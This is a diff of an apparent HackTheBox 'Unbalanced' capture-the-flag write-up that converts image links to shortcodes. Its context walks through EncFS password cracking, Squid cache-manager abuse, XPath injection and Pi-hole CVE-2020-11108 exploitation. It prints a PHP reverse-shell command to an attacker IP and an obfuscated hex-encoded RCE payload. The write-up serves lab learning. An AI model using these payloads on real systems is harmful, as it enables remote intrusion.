@@ -16,17 +16,20 @@ To solve Unbalanced, we'll find configuration backups files in EncFS and after c
 
 ## Portscan
 
-![](images/image-20200801192958121.png)
+{{< image src="images/image-20200801192958121.png" >}}
+
 
 ## Rsync & EncFS
 
 We can list the available modules on the rsync server by specifying the rsync URL and leaving off the module name. The output shows there is an available module called `conf_backups`.
 
-![](images/image-20200801192743922.png)
+{{< image src="images/image-20200801192743922.png" >}}
+
 
 After downloading the remote files we end up with a bunch of files with weird random names.
 
-![](images/image-20200801193241170.png)
+{{< image src="images/image-20200801193241170.png" >}}
+
 
 There's also a file `.encfs6.xml` that contains the configuration for `EncFS 1.9.5`. The encoded key data and salt for the file encryption is contained in the XML file below:
 
@@ -78,15 +81,18 @@ I've never used EncFS before but some quick research shows that it's an encrypte
 
 We don't have the password but luckily there's already a python script in John the Ripper that can extract the hash from the XML and produce it  in a format that can be understood by John the Ripper. 
 
-![](images/image-20200801194238244.png)
+{{< image src="images/image-20200801194238244.png" >}}
+
 
 We'll use the `rockyou.txt` wordlist with John the Ripper to crack it, recovering the password: `bubblegum`
 
-![](images/image-20200801194408192.png)
+{{< image src="images/image-20200801194408192.png" >}}
+
 
 We then mount the filesystem in the `mnt` directory, and we now have access to the decrypted files. We'll look through those files next to find credentials and useful information.
 
-![](images/image-20200801195304488.png)
+{{< image src="images/image-20200801195304488.png" >}}
+
 
 ## Squid
 
@@ -112,21 +118,25 @@ The configuration also contains the cachemgr password: `Thah$Sh1`
 
 The cache manager is the component for Squid that provide reports and statistics about the Squid process running. We can interact with the cache manager over  HTTP manually but to make it a bit easier we can use the `squidclient` CLI utility. I've highlighted `fqdncache` because that's where we'll look to find the IP's of the servers behind the proxy.
 
-![](images/image-20200801200747899.png)
+{{< image src="images/image-20200801200747899.png" >}}
+
 
 With the `squidclient -W 'Thah$Sh1' -U cachemgr -h 10.10.10.200 squidclient cache_object://intranet.unbalanced.htb mgr:fqdncache` command we'll get the cache entries, showing 3 different hosts.
 
-![](images/image-20200801201208461.png)
+{{< image src="images/image-20200801201208461.png" >}}
+
 
 ## Website
 
 Using Burp instead of proxying directly from the browser is better because we'll be able to look at the traffic, modify requests, etc. The configuration from in Burp is shown here:
 
-![](images/image-20200801201823427.png)
+{{< image src="images/image-20200801201823427.png" >}}
+
 
 We can now reach the intranet site through the Squid proxy. The page has a login form for the Employee Area, some package information below and a non-functional contact form at the bottom of the page.
 
-![](images/image-20200801202142101.png)
+{{< image src="images/image-20200801202142101.png" >}}
+
 
 Unfortunately, the login doesn't return anything when we try credentials, it just reloads the same page without an **invalid credentials** error message or other indication that the page works or not. The `http://172.31.179.2/intranet.php` and `http://172.31.179.2/intranet.php` sites are exactly the same and the login form doesn't work either.
 
@@ -134,17 +144,20 @@ However, there's another active host not present in fqdncache that we can find b
 
 This server is configured differently and does return an invalid credential message when try to connect to it. I tried checking for SQL injection but I couldn't find anything manually or through sqlmap.
 
-![](images/image-20200801203244623.png)
+{{< image src="images/image-20200801203244623.png" >}}
+
 
 ## XPath injection
 
 After dirbusting the site for additional clues we find an `employees.xml` file which unfortunately we can't access. However this is a hint that we are probably looking at an XML authentication backend instead of SQL, so we should now be thinking about XPath injection.
 
-![](images/image-20200801204925666.png)
+{{< image src="images/image-20200801204925666.png" >}}
+
 
 After messing with payloads for a while I found that we can return all the entries by using the following request:
 
-![](images/image-20200801210131487.png)
+{{< image src="images/image-20200801210131487.png" >}}
+
 
 ```
 <div class="w3-container"><h3>   rita       Rita</h3><p>      Fubelli</p><p>Role:       rita@unbalanced.htb</p></div>
@@ -211,17 +224,20 @@ log_pass.success(pwd)
 
 Running the script we get the following passwords:
 
-![](images/image-20200801212846920.png)
+{{< image src="images/image-20200801212846920.png" >}}
+
 
 The only credentials that work over SSH are `bryan / ireallyl0vebubblegum!!!`
 
-![](images/image-20200801212949995.png)
+{{< image src="images/image-20200801212949995.png" >}}
+
 
 ## Pi-hole CVE-2020-11108
 
 Checking the listening sockets we see something on port 5553.
 
-![](images/image-20200801213125467.png)
+{{< image src="images/image-20200801213125467.png" >}}
+
 
 Googling port 5553 confirms what we see in the TODO file: it's running the Pi-hole:
 
@@ -254,7 +270,8 @@ The Pi-hole has an RCE CVE documented here: https://frichetten.com/blog/cve-2020
 
 I'll establish an SSH local forward with `ssh -L 9080:127.0.0.1:8080 bryan@10.10.10.200` then reach the admin interface on port 8080. Fortunately the `admin / admin` credentials work and we're able to get in.
 
-![](images/image-20200801213759929.png)
+{{< image src="images/image-20200801213759929.png" >}}
+
 
 We'll just modify the PoC exploit with the right IP for our machine: `php -r '$sock=fsockopen("10.10.14.18",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
@@ -264,14 +281,17 @@ The final payload looks like this:
 aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS'EXEC(HEX2BIN("706870202D72202724736F636B3D66736F636B6F70656E282231302E31302E31342E3138222C34343434293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27"));'&&
 ```
 
-![](images/image-20200801214200971.png)
+{{< image src="images/image-20200801214200971.png" >}}
 
-![](images/image-20200801214225678.png)
+
+{{< image src="images/image-20200801214225678.png" >}}
+
 
 Looking around the container we find a password in the `pihole_config.sh` file:
 
-![](images/image-20200801214525034.png)
+{{< image src="images/image-20200801214525034.png" >}}
+
 
 We can su as root with those creds and pwn the last flag:
 
-![](images/image-20200801214629712.png)
+{{< image src="images/image-20200801214629712.png" >}}
